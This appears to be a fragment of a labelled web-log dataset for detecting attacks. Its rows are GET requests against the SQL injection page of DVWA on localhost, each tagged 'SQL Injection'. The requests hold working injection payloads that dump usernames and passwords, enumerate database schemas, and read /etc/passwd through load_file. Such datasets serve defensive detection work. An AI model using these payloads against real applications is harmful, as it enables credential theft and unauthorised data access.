+"GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+version+FROM+v%24instance&Submit=Submit HTTP/1.1"" 500 295 ""http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=1%27UNION+SELECT+%40%40version&Submit=Submit HTTP/1.1"" 500 295 ""http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+*+FROM+information_schema.tables&Submit=Submit HTTP/1.1"" 500 295",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=1%27UNION+SELECT+*+FROM+information_schema.tables&Submit=Submit HTTP/1.1"" 500 295",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%24getid+%3D+%22SELECT+first_name%2C+last_name+FROM+users+WHERE+user_id+%3D+%27%24id%27%22%3B&Submit=Submit HTTP/1.1"" 500 295",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%25%27+or+%270%27%3D%270&Submit=Submit HTTP/1.1"" 200 1751",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+version%28%29+%23&Submit=Submit HTTP/1.1"" 200 1798",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+%23&Submit=Submit HTTP/1.1"" 200 2428",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D-0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like%27user%25%27+%23&Submit=Submit HTTP/1.1"" 200 1797",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28table_name%2C0x0a%2Ccolumn-name%29+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit HTTP/1.1"" 500 295",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit HTTP/1.1"" 200 1945",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+1%2C%40%40version%23&Submit=Submit HTTP/1.1"" 200 1727",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2C%40%40hostname+%23&Submit=Submit HTTP/1.1"" 200 1715",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%27+order+by+1+%23&Submit=Submit HTTP/1.1"" 200 1667",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+system_user%28%29%2Cuser%28%29+%23&Submit=Submit HTTP/1.1"" 200 1721",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Cdatabase%28%29+%23&Submit=Submit HTTP/1.1"" 200 1714",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Cschema_name+from+information_schema.schemata+%23&Submit=Submit HTTP/1.1"" 200 1741",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Ctable_name+from+information_schema.tables+%23&Submit=Submit HTTP/1.1"" 200 2399",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2C%40%40datadir+%23&Submit=Submit HTTP/1.1"" 200 1721",SQL Injection,3
+"GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+load_file%28%27%2Fetc%2Fpasswd%27%29%2Cnull+%23&Submit=Submit HTTP/1.1"" 200 1723",SQL Injection,3
